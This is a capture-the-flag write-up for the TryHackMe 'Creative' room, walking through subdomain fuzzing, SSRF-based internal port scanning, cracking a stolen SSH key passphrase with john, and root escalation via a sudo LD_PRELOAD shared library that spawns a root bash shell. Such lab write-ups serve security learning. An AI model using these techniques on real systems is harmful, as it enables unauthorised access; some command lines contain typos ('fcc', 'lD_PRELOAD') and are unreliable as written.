---
title: "Creative"
date: 2025-09-13
draft: false
summary: "Writeup for Creative CTF challenge on TryHackMe."
tags: ["linux", "hardcoded creds", "ssrf", "sudo"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/creative/cover.webp"
  caption: "Creative TryHackMe Challenge"
  alt: "Creative cover"
platform: "TryHackMe"
---

Exploit a vulnerable web application and some misconfigurations to gain root privileges.
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/creative

## Reconnaissance

I performed an **nmap** aggressive scan on the target to identify open ports and the services running on them.

```shell
nmap -A -p- TARGET --min-rate 10000 -oN creatve.nmap
```

| **Port** | **Service** |
| -------- | ----------- |
| 22       | ssh         |
| 80       | http        |

![](https://cdn.ziomsec.com/creative/1.webp)

## Initial Foothold

I was able to discover a web server running so I added the IP in my `/etc/hosts` file and accessed the web server through my browser.

![](https://cdn.ziomsec.com/creative/2.webp)

I tried looking for files, directories but found nothing. I then enumerated subdomains and found 1.

```shell
ffuf -u http://creative.thm -H 'Host: FUZZ.creative.thm' -w /usr/share/wordlists/seclists/Discover/DNS/subdomain-top1million-110000.txt -fw 6
```

![](https://cdn.ziomsec.com/creative/3.webp)

After adding the subdomain in the **`hosts`** file, I accessed it and found an interesting feature. It allowed us to send request to a website to see if it is active.

![](https://cdn.ziomsec.com/creative/4.webp)

I started an **http** server on my local system and tried accessing it through the application.

```shell
python3 -m http.server 80
```

![](https://cdn.ziomsec.com/creative/5.webp)

![](https://cdn.ziomsec.com/creative/6.webp)

Since I was able to make the server send requests, I tried using it to execute php, js, python payloads but none of them seemed to work. The application simply displayed the contents of the files. Out of curiosity, I tried accessing the localhost and found the rendered html of the domain.

I then fired up Burp and tried analyzing it in an efficient manner.

![](https://cdn.ziomsec.com/creative/7.webp)

So, if the page existed, I would get the rendered contents of the page else, I would receive an error. I exploited this behavior to scan internal ports using intruder.

![](https://cdn.ziomsec.com/creative/8.webp)

![](https://cdn.ziomsec.com/creative/9.webp)

![](https://cdn.ziomsec.com/creative/10.webp)

I found port 1337 to be hosting the root directory.

![](https://cdn.ziomsec.com/creative/11.webp)

I was then able to access the user flag from *saad*'s home directory.

![](https://cdn.ziomsec.com/creative/12.webp)

I also found `saad`'s **ssh** keys and copied the private key onto my local system.

![](https://cdn.ziomsec.com/creative/13.webp)

I tried logging in using the private key but was prompted for a passphrase. So, I converted the key to **john** crackable format and cracked it using **john** the ripper.

```shell
ssh2john PRIV.KEY > saad.hash
```

![](https://cdn.ziomsec.com/creative/14.webp)

```shell
john --wordlist=/usr/share/wordlists/rockyou.txt saad.hash
```

![](https://cdn.ziomsec.com/creative/15.webp)

Finally, I used the passphrase to log in as *saad*.

```shell
ssh -i saad.key saad@TARGET
```

![](https://cdn.ziomsec.com/creative/16.webp)

## Privilege Escalation

I examined the contents of *saad*'s home directory and found the **.bash_history** file which could hold command history. I viewed the file and found his password.

![](https://cdn.ziomsec.com/creative/17.webp)

I then looked for my **sudo** privileges and found the following

```shell
sudo -l
```

![](https://cdn.ziomsec.com/creative/18.webp)

The **ping** permission in itself wasn't anything special. However, the environment variable `env_keep+=LD_PRELOAD` was something that could be exploited. I could make the program load a library of my choice before running the `ping` command as sudo.

I referred to the below article for reference.
- https://www.hackingarticles.in/linux-privilege-escalation-using-ld-preload/

I created a C code to spawn a **bash** shell and converted it into a library.

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

```shell
fcc -fPIC -shared -o hehe hehe.c -nostartfiles
```

![](https://cdn.ziomsec.com/creative/19.webp)

Finally, I used the environment variable to load my binary before executing the **ping** command as **sudo** and spawned a **bash** shell as **root**.

```shell
sudo lD_PRELOAD=/home/saad/hehe ping
```

![](https://cdn.ziomsec.com/creative/20.webp)

I then captured the root flag from **`/root`**

```shell
cat /root/root.txt
```

![](https://cdn.ziomsec.com/creative/21.webp)

---
